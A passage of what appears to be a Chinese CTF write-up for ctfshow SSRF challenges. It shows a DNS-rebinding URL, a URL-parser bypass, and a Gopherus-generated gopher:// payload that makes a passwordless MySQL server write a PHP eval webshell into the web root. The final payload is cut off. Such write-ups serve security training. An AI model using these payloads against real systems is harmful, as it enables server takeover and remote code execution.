+<p>在网站<a target="_blank" rel="noopener" href="http://ceye.io/%E6%B3%A8%E5%86%8C%E8%B4%A6%E5%8F%B7%EF%BC%8C%E4%BC%9A%E8%87%AA%E5%8A%A8%E5%88%86%E9%85%8D%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8D%E7%BB%99%E4%BD%A0%EF%BC%9A">http://ceye.io/注册账号，会自动分配一个域名给你：</a></p>
+<p>payload:<a target="_blank" rel="noopener" href="http://r.xxxxxx/flag.php">http://r.xxxxxx/flag.php</a><br>xxx为分配的域名</p>
+<p>payload：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>=http://<span class="hljs-number">7</span>f000001.<span class="hljs-number">2</span>f62e200.rbndr.us/flag.php<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-358（正则匹配绕过）"><a href="#web-358（正则匹配绕过）" class="headerlink" title="web-358（正则匹配绕过）"></a>web-358（正则匹配绕过）</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里的正则表示以<code>http://ctf.</code>开头，以<code>show</code>结尾，即匹配<code>http://ctf.*show</code></p>
+<p>payload：</p>
+<p>如果不在<code>ctf.</code>后面加<code>@</code>,解析url时会把<code>ctf.</code>也解析成<strong>host</strong>的内容，如果不在<code>show</code>前面加<code>#</code>或<code>?</code>，会把<strong>show</strong>也解析到<strong>path</strong>中，得不到想要的结果</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://ctf.@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php?show<br><span class="hljs-attr">url</span>=http://ctf.@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<span class="hljs-comment">#show</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-359（打无密码的MySQL）"><a href="#web-359（打无密码的MySQL）" class="headerlink" title="web-359（打无密码的MySQL）"></a>web-359（打无密码的MySQL）</h2><p>首先进去发现是个登录界面<br><img src="/../image/ctfshow-ssrf-1.png"></p>
+<p>Gopherus工具使用获取RCE</p>
+<p>Gopherus需要python2环境，需要安装并默认设置为python2</p>
+<p>使用gopherus工具构造</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">python gopherus.py --exploit mysql</span><br><span class="language-xml"></span><br><span class="language-xml">root</span><br><span class="language-xml"></span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; into outfile &#x27;/var/www/html/1.php&#x27;;</span><br></code></pre></td></tr></table></figure>
+
+<p>生成payload：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3306</span>/_<span class="hljs-variable">%a3</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%85</span><span class="hljs-variable">%a6</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%21</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%64</span><span class="hljs-variable">%00</span><span class="hljs-variable">%66</span><span class="hljs-variable">%03</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%05</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%75</span><span class="hljs-variable">%78</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%08</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%04</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%69</span><span class="hljs-variable">%64</span><span class="hljs-variable">%05</span><span class="hljs-variable">%32</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%35</span><span class="hljs-variable">%35</span><span class="hljs-variable">%0</span>f<span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%73</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%06</span><span class="hljs-variable">%35</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%37</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%32</span><span class="hljs-variable">%32</span><span class="hljs-variable">%09</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%06</span><span class="hljs-variable">%78</span><span class="hljs-variable">%38</span><span class="hljs-variable">%36</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%70</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%67</span><span class="hljs-variable">%72</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%05</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%46</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%03</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%20</span><span class="hljs-variable">%27</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%20</span><span class="hljs-variable">%40</span><span class="hljs-variable">%65</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%28</span><span class="hljs-variable">%24</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%50</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%53</span><span class="hljs-variable">%54</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%31</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>e<span class="hljs-variable">%27</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%20</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%20</span><span class="hljs-variable">%27</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%68</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%31</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%27</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><br></code></pre></td></tr></table></figure>
+
+<p>然后对后面进行URL加密</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:3306</span>/_%<span class="hljs-number">25</span>%<span class="hljs-number">61</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">38</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">61</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span 